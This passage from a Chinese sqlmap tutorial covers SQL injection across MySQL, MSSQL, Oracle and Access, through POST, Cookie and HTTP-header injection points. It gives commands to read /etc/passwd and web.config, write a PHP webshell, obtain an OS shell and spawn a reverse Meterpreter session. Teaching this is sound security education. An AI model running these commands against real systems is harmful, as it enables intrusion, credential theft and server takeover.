stroke="#334155"/>  <rect x="415" y="196" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="196" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="196" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="230.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">字符串拼接</text>  <text x="206" y="218" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">concat(a,b,c) / group_concat()</text>  <text x="421" y="218" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">a+b (字符串相加) / STRING_AGG</text>  <text x="641" y="218" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">a || b / LISTAGG</text>  <text x="866" y="218" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">a &amp; b (Access 运算符)</text>  <rect x="30" y="256" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="256" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="256" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="256" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="256" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="290.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">时间盲注函数</text>  <text x="206" y="278" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">SLEEP(5) / BENCHMARK(1e7,SHA1('x'))</text>  <text x="421" y="278" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">WAITFOR DELAY '00:00:05'</text>  <text x="641" y="278" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">DBMS_LOCK.SLEEP(5) → 需高权限</text>  <text x="866" y="278" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">无原生 → 用笛卡尔积重查询延时</text>  <rect x="30" y="316" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="316" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="316" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="316" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="316" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="350.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">报错注入函数</text>  <text x="206" y="338" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">extractvalue / updatexml / NAME_CON</text>  <text x="421" y="338" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">convert(int,@@version) / cast...</text>  <text x="641" y="338" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">ctxsys.drithsx.sn / DBMS_XMLGEN</text>  <text x="866" y="338" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">无报错注入 → 只能联合/盲注</text>  <rect x="30" y="376" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="376" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="376" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="376" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="376" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="410.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">文件读写</text>  <text x="206" y="398" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">LOAD_FILE('/etc/passwd')</text>  <text x="206" y="418" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">INTO OUTFILE '/tmp/shell.php'</text>  <text x="421" y="398" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">BULK INSERT / OPENROWSET</text>  <text x="641" y="398" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">UTL_FILE / DBMS_LOB</text>  <text x="866" y="398" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">不支持 原生文件</text>  <rect x="30" y="436" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="436" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="436" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="436" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="436" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="470.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">命令执行</text>  <text x="206" y="458" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">--os-shell → udf.dll/so（需 FILE 权限）</text>  <text x="421" y="458" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">xp_cmdshell / sp_oacreate</text>  <text x="421" y="478" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">（需 SA 或 alter server role）</text>  <text x="641" y="458" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">DBMS_SCHEDULER 计划任务 Java 存储过程</text>  <text x="866" y="458" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">完全不支持 → 只能 猜解 表</text>  <rect x="30" y="496" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="496" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="496" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="496" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="496" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="530.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">系统库/元信息库</text>  <text x="206" y="518" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">information_schema.tables / columns</text>  <text x="421" y="518" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">master..sysdatabases</text>  <text x="421" y="538" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">information_schema.tables</text>  <text x="641" y="518" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">SYS.USER_TABLES / ALL_TAB_COLUMNS</text>  <text x="866" y="518" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">MSysObjects (隐藏系统表，需特殊权限)</text>
</svg>

### Oracle特殊语法

Oracle数据库有一些特殊语法需要注意。

### 检测与利用

```bash
sqlmap -u "http://target.example.com/page?id=1" --dbms=Oracle --batch
```

指定数据库类型可以加快检测速度。

---

## 4.13 实战案例：Access注入

### Access特点

Access数据库是轻量级数据库，常见于旧系统。

### 检测与利用

```bash
sqlmap -u "http://target.example.com/page?id=1" --dbms=Access --batch
```

---

## 4.14 POST注入详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss16" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss16g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s16dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss16g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss16dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-16 POST 注入 / Cookie 注入 / HTTP Header 注入三大场景完整示例</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">95% 参数不在 URL 里！= 用 Burp 抓包保存 → 用 -r req.txt 让 SQLMap 自动读是最佳实践</text>  <rect x="30" y="105" width="345" height="268" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="105" width="345" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="202.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">场景 ① POST 表单注入（登录/搜索/提交）</text>  <text x="202.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step 1：Burp 抓 POST 包，存文件 req_login.txt</text>  <text x="202.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step 2：sqlmap -r req_login.txt --batch -p username</text>  <text x="202.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step 3：也可直接写 --data=&quot;user=admin&amp;pass=admin&quot;</text>  <text x="202.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">进阶：--skip=password 只测 user 参数 省时</text>  <text x="202.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">最佳推荐：--data=&quot;&quot; 空数据 + 指定 Content-Type</text>  <rect x="385" y="105" width="345" height="268" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="385" y="105" width="345" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="557.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">场景 ② Cookie 参数注入（WAF 放行 Cookie）</text>  <text x="557.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u &quot;http://t/index.php&quot; -p &quot;userid&quot; --cookie &quot;userid=2; lang=zh&quot;</text>  <text x="557.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">自动识别 Cookie 里的 &amp; 分隔的多个参数</text>  <text x="557.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--level 2 以上才会默认测 Cookie 参数</text>  <text x="557.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">配合 --drop-set-cookie 不接受服务器 Set-Cookie</text>  <text x="557.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">登录态测试：Cookie + --headers &quot;Authorization: Bearer xxx&quot;</text>  <rect x="740" y="105" width="345" height="268" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="740" y="105" width="345" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="912.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">场景 ③ HTTP Header 注入（User-Agent/XFF/Referer）</text>  <text x="912.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-p &quot;User-Agent,X-Forwarded-For,Referer&quot; 指定 Header 参数</text>  <text x="912.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--user-agent=&quot;SQLMAP*&quot;  用 * 标记注入点位置</text>  <text x="912.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">真实案例：日志系统将 UA 存 DB → UA 注入=盲注</text>  <text x="912.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">X-Forwarded-For: 1.1.1.1*  标记 * = 注入点</text>  <text x="912.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Host 头注入也能打 SSRF 二次漏洞</text>  <rect x="30" y="390" width="1020" height="100" rx="12" fill="#020617" stroke="#334155"/>  <rect x="30" y="390" width="1020" height="24" rx="12" fill="#334155"/>  <text x="540" y="407" text-anchor="middle" font-size="12" font-weight="800" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Burp 抓包文件 req_login.txt（* 是手动标注入点，可省略；省略时 SQLMap 自动扫所有参数）</text>  <text x="48" y="422.0" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">POST /api/login HTTP/1.1</text>  <text x="48" y="435.2" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Host: 192.168.1.100</text>  <text x="48" y="448.4" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36</text>  <text x="48" y="461.6" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">X-Forwarded-For: 1.1.1.1*</text>  <text x="48" y="474.8" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Cookie: userid=2*</text>  <text x="48" y="488.0" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Content-Type: application/x-www-form-urlencoded</text>  <text x="48" y="501.2" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Content-Length: 32</text>  <text x="48" y="514.4" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace"></text>  <text x="48" y="527.6" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">username=admin*&amp;password=admin123</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">最佳实践永远是：Burp 抓包 → 复制到文件 → sqlmap -r xxx.txt -p 参数 --batch → 不用麻烦写 --data / -H / --cookie 半天</text>
</svg>

### POST注入场景

当参数通过POST方式提交时，需要使用POST注入。

### 捕获POST请求

使用Burp Suite抓取POST请求，复制请求内容。

### 使用请求文件

```bash
sqlmap -r request.txt --batch
```

request.txt内容：
```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

### 直接指定POST数据

```bash
sqlmap -u "http://target.example.com/login" --data="username=admin&password=test" --batch
```

### 指定测试参数

```bash
sqlmap -u "http://target.example.com/login" --data="username=admin&password=test" -p username --batch
```

只测试username参数。

---

## 4.15 Cookie注入详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss16" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss16g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s16dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss16g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss16dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-16 POST 注入 / Cookie 注入 / HTTP Header 注入三大场景完整示例</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">95% 参数不在 URL 里！= 用 Burp 抓包保存 → 用 -r req.txt 让 SQLMap 自动读是最佳实践</text>  <rect x="30" y="105" width="345" height="268" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="105" width="345" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="202.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">场景 ① POST 表单注入（登录/搜索/提交）</text>  <text x="202.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step 1：Burp 抓 POST 包，存文件 req_login.txt</text>  <text x="202.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step 2：sqlmap -r req_login.txt --batch -p username</text>  <text x="202.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step 3：也可直接写 --data=&quot;user=admin&amp;pass=admin&quot;</text>  <text x="202.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">进阶：--skip=password 只测 user 参数 省时</text>  <text x="202.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">最佳推荐：--data=&quot;&quot; 空数据 + 指定 Content-Type</text>  <rect x="385" y="105" width="345" height="268" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="385" y="105" width="345" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="557.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">场景 ② Cookie 参数注入（WAF 放行 Cookie）</text>  <text x="557.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -u &quot;http://t/index.php&quot; -p &quot;userid&quot; --cookie &quot;userid=2; lang=zh&quot;</text>  <text x="557.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">自动识别 Cookie 里的 &amp; 分隔的多个参数</text>  <text x="557.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--level 2 以上才会默认测 Cookie 参数</text>  <text x="557.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">配合 --drop-set-cookie 不接受服务器 Set-Cookie</text>  <text x="557.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">登录态测试：Cookie + --headers &quot;Authorization: Bearer xxx&quot;</text>  <rect x="740" y="105" width="345" height="268" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="740" y="105" width="345" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="912.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">场景 ③ HTTP Header 注入（User-Agent/XFF/Referer）</text>  <text x="912.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-p &quot;User-Agent,X-Forwarded-For,Referer&quot; 指定 Header 参数</text>  <text x="912.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--user-agent=&quot;SQLMAP*&quot;  用 * 标记注入点位置</text>  <text x="912.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">真实案例：日志系统将 UA 存 DB → UA 注入=盲注</text>  <text x="912.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">X-Forwarded-For: 1.1.1.1*  标记 * = 注入点</text>  <text x="912.5" y="219" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Host 头注入也能打 SSRF 二次漏洞</text>  <rect x="30" y="390" width="1020" height="100" rx="12" fill="#020617" stroke="#334155"/>  <rect x="30" y="390" width="1020" height="24" rx="12" fill="#334155"/>  <text x="540" y="407" text-anchor="middle" font-size="12" font-weight="800" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Burp 抓包文件 req_login.txt（* 是手动标注入点，可省略；省略时 SQLMap 自动扫所有参数）</text>  <text x="48" y="422.0" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">POST /api/login HTTP/1.1</text>  <text x="48" y="435.2" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Host: 192.168.1.100</text>  <text x="48" y="448.4" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36</text>  <text x="48" y="461.6" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">X-Forwarded-For: 1.1.1.1*</text>  <text x="48" y="474.8" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Cookie: userid=2*</text>  <text x="48" y="488.0" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Content-Type: application/x-www-form-urlencoded</text>  <text x="48" y="501.2" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">Content-Length: 32</text>  <text x="48" y="514.4" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace"></text>  <text x="48" y="527.6" font-size="9.8" fill="#67e8f9" font-family="Consolas,Monospace">username=admin*&amp;password=admin123</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">最佳实践永远是：Burp 抓包 → 复制到文件 → sqlmap -r xxx.txt -p 参数 --batch → 不用麻烦写 --data / -H / --cookie 半天</text>
</svg>

### Cookie注入场景

当注入点在Cookie中时，使用Cookie注入。

### 使用Cookie参数

```bash
sqlmap -u "http://target.example.com/page" --cookie="id=1" --batch
```

### 指定Cookie测试参数

```bash
sqlmap -u "http://target.example.com/page" --cookie="id=1; session=abc" -p id --batch
```

---

## 4.16 HTTP Header注入详解

### Header注入场景

注入点可能在HTTP头中，如：
- X-Forwarded-For
- Referer
- User-Agent

### 指定Header注入

```bash
sqlmap -u "http://target.example.com/page" --headers="X-Forwarded-For: 1*" --batch
```

`*`表示注入点位置。

---

## 4.17 高级功能详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 570" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss17" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss17g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s17dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss17g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss17dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-17 文件读写 + OS-Shell 系统权限执行两柄利刃（MySQL/MSSQL/Oracle）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">FILE 权限=读任意配置文件（/etc/passwd / web.config）；SUPER/SA 权限=写一句话木马 + 拿交互 OS Shell</text>  <rect x="30" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#8b5cf6"/>  <text x="280" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial">① 文件读写（--file-read / --file-write / --file-dest）</text>  <rect x="50" y="150" width="460" height="62" rx="10" fill="#0f172a" stroke="#8b5cf6"/>  <text x="60" y="170" font-size="11.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">读取 /etc/passwd</text>  <text x="60" y="186" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--file-read=/etc/passwd</text>  <text x="60" y="200" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">→ 自动存 ~/.sqlmap/output/.../files 目录</text>  <rect x="50" y="225" width="460" height="62" rx="10" fill="#0f172a" stroke="#a855f7"/>  <text x="60" y="245" font-size="11.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">读取 web.config (ASPX)</text>  <text x="60" y="261" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--file-read=&quot;C:\inetpub\wwwroot\web.config&quot;</text>  <text x="60" y="275" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">= 拿数据库连接字符串 / AES 密钥</text>  <rect x="50" y="300" width="460" height="62" rx="10" fill="#0f172a" stroke="#ec4899"/>  <text x="60" y="320" font-size="11.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">写一句话 WebShell.php</text>  <text x="60" y="336" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--file-write=./shell.php</text>  <text x="60" y="350" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--file-dest=&quot;/var/www/html/shell.php&quot;</text>  <rect x="50" y="375" width="460" height="62" rx="10" fill="#0f172a" stroke="#dc2626"/>  <text x="60" y="395" font-size="11.5" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">写自定义 UDF DLL/so 到 plugin 目录</text>  <text x="60" y="411" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">→ create function sys_eval returns string soname</text>  <text x="60" y="425" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">→ select sys_eval('whoami')= OS 命令执行</text>  <rect x="550" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#ef4444"/>  <text x="800" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#fca5a5" font-family="Microsoft YaHei,Arial">② OS 命令执行 / 交互 Shell（--os-cmd / --os-shell / --os-pwn）</text>  <rect x="570" y="150" width="460" height="62" rx="10" fill="#0f172a" stroke="#dc2626"/>  <text x="580" y="170" font-size="11.5" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">前提条件</text>  <text x="580" y="186" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">MySQL: FILE+SUPER 权限 + secure_file_priv='' 空</text>  <text x="580" y="198" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">MSSQL: SA 权限 + xp_cmdshell 开</text>  <text x="580" y="210" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Oracle: Java 存储过程权限</text>  <rect x="570" y="225" width="460" height="62" rx="10" fill="#0f172a" stroke="#ef4444"/>  <text x="580" y="245" font-size="11.5" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">单命令执行</text>  <text x="580" y="261" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--os-cmd=&quot;whoami /priv&quot;</text>  <text x="580" y="273" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--os-cmd=&quot;ipconfig /all&quot;</text>  <text x="580" y="285" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">→ 一条命令回显（不交互）</text>  <rect x="570" y="300" width="460" height="62" rx="10" fill="#0f172a" stroke="#f59e0b"/>  <text x="580" y="320" font-size="11.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">交互 Shell 控制台</text>  <text x="580" y="336" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--os-shell → 进入 meterpreter 式交互 cmd/bash</text>  <text x="580" y="348" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">whoami → hostname → dir C:\ / ls -la</text>  <text x="580" y="360" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">退出命令 Ctrl+C / exit</text>  <rect x="570" y="375" width="460" height="62" rx="10" fill="#0f172a" stroke="#a855f7"/>  <text x="580" y="395" font-size="11.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">弹反向 Meterpreter</text>  <text x="580" y="411" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">--os-pwn --msf-path=/usr/share/metasploit-framew</text>  <text x="580" y="423" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">自动生成 payload + 上传执行 + 回连</text>  <text x="580" y="435" font-size="9.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">直接接入 MSF console 管理</text>  <rect x="30" y="500" width="1020" height="34" rx="8" fill="#020617" stroke="#dc2626"/>  <text x="540" y="521" text-anchor="middle" font-size="11.5" fill="#fecaca" font-family="Microsoft YaHei,Arial">⚠ MySQL 8.0 新坑：my.cnf 里 secure_file_priv=NULL（默认），--file-write 写不了 → 需要目标管理员改配置才能用文件功能</text>
</svg>

